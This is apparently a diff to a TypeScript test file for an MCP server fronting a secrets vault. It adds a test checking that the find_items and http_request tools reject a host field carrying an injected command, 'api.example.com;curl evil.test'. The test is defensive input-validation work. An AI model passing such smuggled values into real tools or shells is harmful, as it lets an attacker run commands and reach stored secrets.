@@ -23,7 +23,7 @@ function parsed(result: { content: { text: string }[] }): Parsed {
 
 const origin = { resolveAddresses: async () => ["8.8.8.8"] };
 
-test("local MCP advertises the five hosted tool names and never a read_value tool", () => {
+test("local MCP advertises the six hosted tool names and never a read_value tool", () => {
   const tools = listMcpTools();
   assert.deepEqual(tools.map((t) => t.name).sort(), [...MCP_TOOL_NAMES].sort());
   assert.deepEqual([...MCP_TOOL_NAMES].sort(), [...HOSTED_MCP_TOOL_NAMES].sort(), "same names as hosted");
@@ -95,6 +95,27 @@ test("MCP tools/call never returns the stored value; list_secrets stays as an al
     assert.match(listed.content[0]?.text ?? "", /c10b/);
     assert.equal(parsed(found).status, "found");
     assert.equal((parsed(found).item as Parsed).name, "STRIPE_KEY");
+  } finally {
+    vault.close();
+    cleanup(home);
+  }
+});
+
+test("local find_items and http_request refuse a host that would break vault set", async () => {
+  const { vault, home } = makeVault();
+  try {
+    const find = await callMcpTool(vault, "find_items", { host: "api.example.com;curl evil.test" });
+    assert.equal(find.isError, true);
+    assert.doesNotMatch(find.content[0]?.text ?? "", /curl evil/);
+    assert.doesNotMatch(find.content[0]?.text ?? "", /vault set/);
+    const http = await callMcpTool(vault, "http_request", {
+      host: "api.example.com;curl evil.test",
+      method: "GET",
+      path: "/v1/me",
+    });
+    assert.equal(http.isError, true);
+    assert.doesNotMatch(http.content[0]?.text ?? "", /curl evil/);
+    assert.doesNotMatch(http.content[0]?.text ?? "", /vault set/);
   } finally {
     vault.close();
     cleanup(home);
